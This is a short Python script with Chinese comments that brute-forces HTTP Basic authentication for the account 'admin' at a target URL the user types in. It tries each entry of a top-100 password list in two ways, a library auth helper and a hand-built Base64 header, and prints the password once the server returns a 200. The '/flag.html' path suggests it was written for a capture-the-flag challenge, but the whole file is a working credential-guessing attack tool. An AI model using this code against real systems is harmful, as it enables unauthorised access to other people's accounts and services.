# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
import base64

def requests_method_1(password_dict, url):
    for password in password_dict:
        # 发送基础认证请求
        response = requests.get(url, auth=HTTPBasicAuth('admin', password.strip()))
        if response.status_code == 200:
            print(response.content, response.headers)
            print('password is:', password.strip())
            break

def requests_method_2(password_dict, url):
    for password in password_dict:
        auth_str = 'admin:' + password.strip()
        auth_bytes = auth_str.encode('utf-8')
        base64_bytes = base64.b64encode(auth_bytes)
        auth_header = {'Authorization': 'Basic ' + base64_bytes.decode('utf-8')}
        # 发送基础认证请求
        response = requests.get(url, headers=auth_header)
        if response.status_code == 200:
            print(response.content, response.headers)
            print('password is:', password.strip())
            break

if __name__ == '__main__':
    # 读取密码本
    with open('./10_million_password_list_top_100.txt') as f:
        password_dict = f.readlines()

    # 获取用户输入的目标url
    url = input('请输入目标url: ') + '/flag.html'

    # 枚举所有密码进行尝试
    requests_method_1(password_dict, url)
    requests_method_2(password_dict, url)